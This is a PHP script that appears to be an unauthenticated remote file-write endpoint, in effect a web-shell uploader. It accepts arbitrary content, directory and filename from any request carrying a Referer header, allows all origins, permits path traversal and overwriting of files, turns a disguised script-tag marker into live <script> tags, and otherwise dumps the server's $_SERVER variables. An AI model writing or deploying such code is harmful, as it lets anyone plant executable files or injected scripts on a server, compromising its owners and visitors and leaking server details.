<?php
require './func.php';
header('Access-Control-Allow-Origin: *');
if (isset($_SERVER['HTTP_REFERER']) || isset($_REQUEST['force'])) {
  $o = [];
  $c = (isset($_REQUEST['content']) ? trim(str_replace(['<!--s+c+r+i+p+t>', '</s+c+r+i+p+t-->'], ['<script>', '</script>'], urldecode($_REQUEST['content']))) : false);
  $d = (isset($_REQUEST['dir']) && !empty(trim($_REQUEST['dir'])) ? trim($_REQUEST['dir']) : false);
  $n = (isset($_REQUEST['filename']) ? trim($_REQUEST['filename']) : false);


  hj();
  if ($c && $d && $n) {
    $d = __DIR__ . '/' . $d;
    _file_($d . '/.htaccess', 'Options -Indexes');
    if (isset($_REQUEST['force']) && $_REQUEST['force'] != 'false' && $_REQUEST['force'] != '0') {
      if (file_exists($d . '/' . $n)) {
        unlink($d . '/' . $n);
      }
    }
    if (file_put_contents($d . '/' . $n, $c)) {
      $f = $d . '/' . $n;
      $o['success'] = file_exists($f);
      $o['url'] = gen_url($f);
    }
  } else {
    $o['server'] = $_SERVER;
  }

  echo cj($o);
} else {
  echo cj(['error' => 'undefined']);
}

function hj()
{
  if (!headers_sent()) {
    return header('Content-type: application/json; charset=utf-8');
  }
}

function cj($data)
{
  return json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
}

function gen_url($str)
{
  $host = $_SERVER['HTTP_HOST'];
  $proto = $protocol = (!empty($_SERVER['HTTPS']) && 'off' !== $_SERVER['HTTPS'] || 443 == $_SERVER['SERVER_PORT']) ? 'https://' : 'http://';
  return $proto . $host . '/' . str_replace(ROOT, '', $str);
}
